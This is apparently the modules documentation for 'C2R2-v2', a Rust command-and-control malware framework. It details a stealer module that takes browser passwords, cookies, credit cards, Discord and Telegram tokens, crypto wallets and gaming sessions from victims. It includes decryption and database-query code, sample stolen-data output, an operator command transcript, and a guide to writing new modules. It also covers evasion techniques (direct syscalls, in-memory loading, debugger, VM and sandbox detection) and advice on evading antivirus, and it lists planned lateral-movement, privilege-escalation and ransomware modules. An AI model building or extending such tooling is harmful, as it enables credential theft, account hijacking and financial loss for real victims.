# Modules Documentation

This document provides detailed information about C2R2-v2's modular architecture and available modules.

## Overview

C2R2-v2 uses a modular design where the base agent is lightweight (~60KB) and additional capabilities are loaded as encrypted modules on-demand. This approach provides:

- **Minimal Footprint**: Base agent contains only essential C2 functionality
- **Flexibility**: Load capabilities only when needed
- **Stealth**: Modules are encrypted and loaded into memory (no disk writes)
- **Extensibility**: Easy to add new modules without modifying the agent

## Module Architecture

### Module Lifecycle

```
1. Build Module        → Compile as Windows DLL
2. Encrypt Module      → AES-256-GCM encryption with random key
3. Store on Server     → Save encrypted module + key
4. Upload on Demand    → Transfer encrypted module to agent
5. Decrypt in Memory   → Agent decrypts module using key
6. Execute Functions   → Call exported C functions
7. Cleanup            → Free memory and unload module
```

### Module Structure

All modules follow this standard interface:

```rust
/// Initialize module
#[no_mangle]
pub extern "C" fn module_init() -> i32 {
    // Setup and initialization
    // Returns: 0 on success, error code otherwise
}

/// Main module functionality
#[no_mangle]
pub extern "C" fn module_execute() -> *mut c_char {
    // Perform module's main task
    // Returns: C string pointer with results
}

/// Cleanup resources
#[no_mangle]
pub extern "C" fn module_cleanup() {
    // Free resources, close handles
}

/// Free returned strings
#[no_mangle]
pub extern "C" fn free_string(s: *mut c_char) {
    unsafe {
        if !s.is_null() {
            let _ = CString::from_raw(s);
        }
    }
}
```

## Available Modules

### 1. Stealer Module

**Package**: `stealer-dll`  
**Size**: ~2MB (unencrypted)  
**Command**: `/harvest`  
**Privileges**: User (Admin for some features)

#### Description

The stealer module harvests credentials, cookies, autofill data, and tokens from various applications installed on the target system.

#### Capabilities

##### Browser Credential Stealing

**Chromium-based browsers**:
- Google Chrome
- Microsoft Edge
- Brave Browser
- Opera / Opera GX
- Vivaldi
- Chromium

**Features**:
- Passwords (decrypted via Windows DPAPI)
- Cookies (including session cookies)
- Autofill data (names, addresses, phone numbers)
- Credit card information
- Form data

**Firefox-based browsers**:
- Mozilla Firefox
- Waterfox
- LibreWolf
- Firefox ESR

**Features**:
- Passwords (decrypted from logins.json)
- Cookies
- Form history
- **Note**: Firefox credit cards are NOT supported (separate encryption key required)

##### Communication Platform Tokens

**Discord**:
- Location: `%APPDATA%\Discord\Local Storage\leveldb`
- Tokens from: Discord app, Discord PTB, Discord Canary
- Format: `mfa.xxxx` or `Nxxxx` tokens
- Use: Access Discord account, read messages, impersonate user

**Telegram**:
- Location: `%APPDATA%\Telegram Desktop\tdata`
- Session files: `key_data`, `D877F783D5D3EF8C*`
- Use: Session hijacking (import into new Telegram instance)

##### Cryptocurrency Wallets

**Supported wallets**:
- Exodus Wallet
- Atomic Wallet
- Electrum
- Metamask (browser extension)
- Coinbase Wallet

**Data stolen**:
- Wallet files
- Seed phrases (if stored locally)
- Private keys
- Configuration files

**Warning**: Stolen wallet data can lead to complete loss of funds!

##### Gaming Platforms

**Steam**:
- Location: Steam install directory
- Files: `config/loginusers.vdf`, `ssfn*` files
- Data: Username, Steam ID, session files

**Epic Games**:
- Location: `%LOCALAPPDATA%\EpicGamesLauncher\Saved`
- Files: Configuration and login data

**Use**: Account access, game library visibility

#### Technical Implementation

**Decryption Methods**:

```rust
// Chromium DPAPI decryption
fn decrypt_chromium_password(encrypted_password: &[u8]) -> Result<String> {
    // 1. Remove "v10" or "v11" prefix
    // 2. Decrypt using Windows DPAPI (CryptUnprotectData)
    // 3. Return plaintext password
}

// Firefox decryption (NSS library)
fn decrypt_firefox_password(encrypted: &str) -> Result<String> {
    // 1. Load NSS library (nss3.dll)
    // 2. Initialize NSS with profile path
    // 3. Decrypt using PK11SDR_Decrypt
    // 4. Return plaintext password
}
```

**Database Access**:

```rust
// Access Chrome/Chromium SQLite databases
let conn = Connection::open(profile_path.join("Login Data"))?;
let mut stmt = conn.prepare("SELECT origin_url, username_value, password_value FROM logins")?;

while let Ok(Some(row)) = stmt.query_row([], |row| {
    Ok(Credential {
        browser: "Chrome".to_string(),
        url: row.get(0)?,
        username: row.get(1)?,
        password: decrypt_password(&row.get::<_, Vec<u8>>(2)?)?,
    })
})
```

**Anti-Analysis Features**:

1. **Direct Syscalls**: Bypass userland API hooks
2. **Memory Injection**: Load libraries directly into memory
3. **String Obfuscation**: Hide sensitive strings from static analysis
4. **No Disk Writes**: All operations in memory
5. **Process Checks**: Detect debuggers and analysis tools

#### Output Format

```
═══ STOLEN DATA ═══
Total: 247 items found

=== Passwords (85) ===
[Chrome] https://gmail.com
  User: john@gmail.com
  Pass: MySecretPassword123

[Firefox] https://github.com
  User: johndoe
  Pass: GitHubP@ssw0rd

[Edge] https://outlook.com
  User: john.doe@company.com
  Pass: Work123!

=== Cookies (120) ===
[Chrome] .google.com (Session)
  Name: SID
  Value: DQAAAMcAAAD...
  
[Chrome] .facebook.com (Persistent)
  Name: c_user
  Value: 100012345678

=== Autofill (25) ===
[Chrome] John Doe
  Email: john@gmail.com
  Phone: +1234567890
  Address: 123 Main St, City, State 12345

=== Credit Cards (3) ===
[Chrome] Visa ****1234
  Expiry: 12/25
  Cardholder: JOHN DOE

[Edge] Mastercard ****5678
  Expiry: 06/26
  Cardholder: JOHN DOE

=== Discord Tokens (2) ===
[Discord] mfa.Ab1Cd2Ef3Gh4Ij5Kl6Mn7Op8Qr9St0Uv1Wx2Yz3
[Discord PTB] NzY4MzQyODc1MzE2NzI4ODMy.X5Iw3g.K9_example_token_here

=== Telegram Sessions (1) ===
[Telegram Desktop]
  Path: C:\Users\john\AppData\Roaming\Telegram Desktop\tdata
  Files: key_data, D877F783D5D3EF8C1, D877F783D5D3EF8C2
  Size: 145 KB

=== Wallets (2) ===
[Exodus]
  Path: C:\Users\john\AppData\Roaming\Exodus
  Found: wallet.dat, seed.seco
  Size: 2.3 MB
  
[Metamask] (Chrome Extension)
  Vault: {"data":"encrypted_vault_data_here..."}

=== Gaming (2) ===
[Steam]
  User: steamuser123
  Steam ID: 76561198012345678
  Path: C:\Program Files (x86)\Steam
  
[Epic Games]
  Path: C:\Users\john\AppData\Local\EpicGamesLauncher
  Config files: 3
```

#### Usage

```bash
# Select target agent
C2R2> /select 1

# Execute harvest
C2R2 [1]> /harvest
[*] Uploading stealer module (first time only)...
[*] Module uploaded: stealer.enc (2.1 MB)
[*] Executing harvest...
[*] Collection in progress (30-60 seconds)...
[+] Harvest complete!
[*] Results saved to: harvests/client1_20240115_114523.txt
```

#### Limitations

1. **Firefox Credit Cards**: Not supported (requires separate master key)
2. **Chrome/Edge on Win11**: May require elevation for some profiles
3. **Locked Databases**: Browser must be closed for SQLite access (or use shadow copies)
4. **Encrypted Wallets**: Only file extraction, not password cracking

#### OPSEC Considerations

⚠️ **High Impact Operation**:
- Generates significant disk I/O (database access)
- May trigger AV/EDR (credential access behavior)
- Takes 30-60 seconds to complete
- Memory usage spike (~20MB)

**Recommendations**:
- Execute during off-hours
- Ensure AV/EDR is evaded first
- Consider splitting into multiple smaller operations
- Clean up module after use

## Module Development

### Creating a New Module

#### Step 1: Create Module Project

```bash
# Add to workspace in Cargo.toml
[workspace]
members = [
    "builder",
    "agent",
    "c2r2-server",
    "stealer-dll",
    "my-new-module"  # Add your module
]

# Create module directory
cargo new --lib my-new-module
```

#### Step 2: Configure Module Build

```toml
# my-new-module/Cargo.toml
[package]
name = "my-new-module"
version = "1.0.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]  # Build as DLL

[dependencies]
# Add your dependencies
```

#### Step 3: Implement Module Interface

```rust
// my-new-module/src/lib.rs
#![allow(non_snake_case)]

use std::os::raw::c_char;
use std::ffi::CString;

#[no_mangle]
pub extern "C" fn module_init() -> i32 {
    // Initialization logic
    0  // Return 0 on success
}

#[no_mangle]
pub extern "C" fn module_execute() -> *mut c_char {
    // Main functionality
    let result = perform_task();
    
    match CString::new(result) {
        Ok(s) => s.into_raw(),
        Err(_) => {
            let err = CString::new("ERROR:Module execution failed").unwrap();
            err.into_raw()
        }
    }
}

#[no_mangle]
pub extern "C" fn free_string(s: *mut c_char) {
    unsafe {
        if !s.is_null() {
            let _ = CString::from_raw(s);
        }
    }
}

fn perform_task() -> String {
    // Your module logic here
    String::from("Module executed successfully")
}

// DllMain for Windows
#[cfg(target_os = "windows")]
#[no_mangle]
pub extern "system" fn DllMain(
    _hinst_dll: *mut std::ffi::c_void,
    fdw_reason: u32,
    _lpv_reserved: *mut std::ffi::c_void,
) -> i32 {
    match fdw_reason {
        1 => { /* DLL_PROCESS_ATTACH */ },
        0 => { /* DLL_PROCESS_DETACH */ },
        _ => {}
    }
    1  // TRUE
}
```

#### Step 4: Build and Encrypt Module

```bash
# Build module for Windows
cargo build --release --target x86_64-pc-windows-gnu --package my-new-module

# Encrypt module using builder
cd builder
# Add encryption support for your module
cargo run --release -- encrypt-module --input ../target/x86_64-pc-windows-gnu/release/my_new_module.dll
```

#### Step 5: Add Server Command

```rust
// c2r2-server/src/main.rs
"/mycommand" => {
    if let Some(client) = &selected_client {
        // Upload module
        upload_module(client, "my-new-module.enc").await;
        
        // Execute module
        let command = "__EXECUTE_MODULE__:my-new-module\n";
        send_command(client, command).await;
    } else {
        eprintln!("❌ No client selected");
    }
}
```

#### Step 6: Add Agent Handler

```rust
// agent/src/main.rs
if command.starts_with("__EXECUTE_MODULE__:") {
    let module_name = command.strip_prefix("__EXECUTE_MODULE__:").unwrap();
    
    // Load and execute module
    let result = execute_module(module_name);
    
    let response = format!("{}{}", result, DELIMITER);
    writer.write_all(response.as_bytes()).ok();
    writer.flush().ok();
}
```

### Module Best Practices

1. **Error Handling**:
   - Never panic (use `catch_unwind` if necessary)
   - Return error strings instead of crashing
   - Clean up resources even on error

2. **Memory Safety**:
   - Always free allocated C strings
   - Use RAII patterns for resources
   - Avoid memory leaks

3. **OPSEC**:
   - Obfuscate sensitive strings
   - Use direct syscalls when possible
   - Minimize disk I/O
   - Clean up artifacts

4. **Performance**:
   - Keep execution time reasonable (<60s)
   - Avoid blocking operations
   - Stream large data instead of buffering
   - Release memory when done

## Planned Modules

Future modules in development:

### Keylogger Module
- Capture keystrokes
- Screenshot capture
- Clipboard monitoring

### Lateral Movement Module
- SMB pass-the-hash
- WMI remote execution
- PSExec-style deployment

### Privilege Escalation Module
- UAC bypass techniques
- Kernel exploits (when available)
- Token manipulation

### Network Scanner Module
- Port scanning
- Service enumeration
- ARP scanning

### Ransomware Module (Educational Only)
- File encryption
- Ransom note generation
- Decryption key management

## Module Security

### Encryption

All modules use AES-256-GCM encryption:

```rust
// Encryption
let key = generate_random_key();  // 256-bit key
let nonce = generate_random_nonce();  // 96-bit nonce
let cipher = Aes256Gcm::new(&key);
let ciphertext = cipher.encrypt(&nonce, module_bytes.as_ref())?;

// Decryption (in agent)
let cipher = Aes256Gcm::new(&key);
let plaintext = cipher.decrypt(&nonce, ciphertext.as_ref())?;
```

### Memory Loading

Modules are loaded directly into memory without touching disk:

```rust
// Load DLL from memory
let module_handle = load_library_from_memory(decrypted_bytes);
let execute_fn = get_proc_address(module_handle, "module_execute");
let result = execute_fn();
```

### Anti-Analysis

Modules include anti-analysis features:

1. **Debugger Detection**: Check for attached debuggers
2. **VM Detection**: Identify virtual machine environments
3. **Sandbox Detection**: Recognize sandboxed environments
4. **Time Checks**: Detect time manipulation
5. **Process Checks**: Look for analysis tools

## Troubleshooting

### Module Won't Load

**Error**: `Failed to load module`

**Causes**:
1. Module not encrypted properly
2. Key mismatch
3. Corrupted module file
4. Incompatible architecture

**Solutions**:
```bash
# Rebuild and re-encrypt
cargo clean
./build-stealer.sh
cd builder
cargo run --release -- encrypt-module
```

### Module Execution Fails

**Error**: `Module execution returned error`

**Debug steps**:
1. Check agent logs (if enabled)
2. Test module locally in debug mode
3. Verify dependencies are available
4. Check for missing DLLs

### Performance Issues

**Symptom**: Module takes too long to execute

**Solutions**:
1. Optimize database queries
2. Use parallel processing
3. Reduce I/O operations
4. Stream results instead of buffering

## API Reference

See [API.md](API.md) for detailed module API documentation.

## Contributing

To contribute a new module:

1. Follow the module development guide above
2. Write comprehensive tests
3. Document all functions
4. Follow Rust best practices
5. Submit a pull request

See [CONTRIBUTING.md](CONTRIBUTING.md) for full guidelines.

---

**Note**: Always use modules responsibly and only on systems you have permission to test.
